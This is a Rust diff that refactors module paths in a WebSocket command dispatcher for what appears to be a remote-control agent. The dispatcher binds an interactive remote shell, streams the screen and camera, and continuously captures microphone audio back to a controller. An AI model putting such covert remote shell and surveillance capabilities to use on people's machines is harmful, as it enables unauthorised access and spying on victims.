@@ -1,21 +1,22 @@
 use libra_common::protocol::{WebSocketMessage, ws_type};
-use libra_comm::ws::WsSender;
+use crate::ws::WsSender;
 use libra_platform::get_executor;
 
-use super::EngineShared;
-use super::shell::{bind_shell, handle_shell_input, unbind_shell};
-use super::streams::{start_camera_stream, start_screen_stream};
-use super::utils::{blocking_val, data_str, data_u64, run_module, ws_send};
+use crate::SharedState;
+use crate::shell::{bind_shell, handle_shell_input, unbind_shell};
+use crate::streams::{start_camera_stream, start_screen_stream};
+use crate::utils::{blocking_val, data_str, data_u64, ws_send};
+use crate::module_mgr::run_module;
 
 /// Dispatch a single inbound WebSocket message. Called from a spawned task per
 /// message, so independent tasks (and their module executions) run in parallel;
 /// only the states that must stay serialized (interactive shell session,
 /// screen/camera streams) are guarded by their own mutexes.
 pub(crate) async fn dispatch(
-    shared: &std::sync::Arc<EngineShared>,
+    shared: &std::sync::Arc<SharedState>,
     tx: &WsSender,
     shell_tx: &tokio::sync::mpsc::UnboundedSender<WebSocketMessage>,
-    module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
+    module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_mgr::ModuleManager>>,
     msg: WebSocketMessage,
 ) {
     let agent_id = shared.agent_id.clone();
@@ -378,7 +379,7 @@ pub(crate) async fn dispatch(
 
         // ── Screen ─────────────────────────────────────────
         ws_type::SCREEN_LIST => {
-            let r = libra_modules::execution::ScreenCapture::list_screens();
+            let r = crate::capture::ScreenCapture::list_screens();
             ws_send(tx, &agent_id, "screen.list.result", &r, rid).await;
         }
         ws_type::SCREEN_BIND => {
@@ -395,7 +396,7 @@ pub(crate) async fn dispatch(
             start_screen_stream(shared, data, agent_id.clone(), tx.clone()).await;
         }
         ws_type::CAMERA_LIST => {
-            let r = libra_modules::execution::CameraCapture::list_cameras();
+            let r = crate::capture::CameraCapture::list_cameras();
             ws_send(tx, &agent_id, "camera.list.result", &r, rid).await;
         }
         ws_type::CAMERA_BIND | ws_type::CAMERA_CONFIG => {
@@ -408,20 +409,20 @@ pub(crate) async fn dispatch(
             ws_send(tx, &agent_id, "camera.unbind.result", r#"{"status":"ok"}"#, rid).await;
         }
         ws_type::MIC_LIST => {
-            let r = libra_modules::execution::MicCapture::list_devices();
+            let r = crate::capture::MicCapture::list_devices();
             ws_send(tx, &agent_id, "mic.list.result", &r, rid).await;
         }
         ws_type::MIC_BIND => {
             let idx = data_u64(&data, "deviceIndex", 0) as u32;
-            let r = libra_modules::execution::MicCapture::start_capture(idx);
+            let r = crate::capture::MicCapture::start_capture(idx);
             ws_send(tx, &agent_id, "mic.data", &r, rid).await;
 
             // 持续流式发送 1 秒 PCM 块，直到 stop_capture 置位。
             let stream_tx = tx.clone();
             let stream_agent = agent_id.clone();
             tokio::spawn(async move {
-                while libra_modules::execution::MicCapture::is_active() {
-                    let chunk = libra_modules::execution::MicCapture::capture_chunk();
+                while crate::capture::MicCapture::is_active() {
+                    let chunk = crate::capture::MicCapture::capture_chunk();
                     if !chunk.is_empty() {
                         ws_send(&stream_tx, &stream_agent, "mic.data", &chunk, None).await;
                     }
@@ -430,7 +431,7 @@ pub(crate) async fn dispatch(
             });
         }
         ws_type::MIC_UNBIND => {
-            let r = libra_modules::execution::MicCapture::stop_capture();
+            let r = crate::capture::MicCapture::stop_capture();
             ws_send(tx, &agent_id, "mic.unbind.result", &r, rid).await;
         }
 
